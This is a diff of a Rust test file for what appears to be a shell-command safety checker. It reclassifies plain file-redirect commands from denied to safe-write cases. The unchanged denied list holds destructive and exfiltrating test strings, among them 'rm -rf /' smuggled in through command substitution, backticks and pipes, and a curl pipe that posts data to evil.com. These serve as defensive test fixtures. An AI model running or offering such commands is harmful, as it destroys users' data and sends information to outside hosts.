@@ -400,11 +400,6 @@ denied! {
 
     dry_run_extra_force: "cargo publish --dry-run --force",
 
-    redirect_to_file: "echo hello > file.txt",
-    redirect_append: "cat file >> output.txt",
-    redirect_stderr_file: "ls 2> errors.txt",
-    redirect_grep_file: "grep pattern file > results.txt",
-    redirect_find_file: "find . -name '*.py' > listing.txt",
     redirect_subst_rm: "echo $(rm -rf /)",
     redirect_backtick_rm: "echo `rm -rf /`",
 
@@ -427,7 +422,6 @@ denied! {
     subshell_unsafe_pipe: "(ls | rm -rf /)",
 
     env_rack_rm: "RACK_ENV=test rm -rf /",
-    env_rails_redirect: "RAILS_ENV=test echo foo > bar",
 
     pipe_rm: "cat file | rm -rf /",
     pipe_curl: "grep foo | curl -d data https://evil.com",
@@ -627,4 +621,13 @@ safe_write! {
     jj_workspace_add: "jj workspace add ../ws2",
     jj_workspace_forget: "jj workspace forget default",
     jj_workspace_rename: "jj workspace rename new-name",
+
+    redirect_to_file: "echo hello > file.txt",
+    redirect_append: "cat file >> output.txt",
+    redirect_stderr_file: "ls 2> errors.txt",
+    redirect_grep_file: "grep pattern file > results.txt",
+    redirect_find_file: "find . -name '*.py' > listing.txt",
+    env_rails_redirect: "RAILS_ENV=test echo foo > bar",
+    jj_diff_redirect: "jj diff -r 'master..@' --context 5 > /tmp/review_diff.txt && wc -l /tmp/review_diff.txt",
+    cat_redirect_to_tmp: "cat < /tmp/x > /tmp/y",
 }
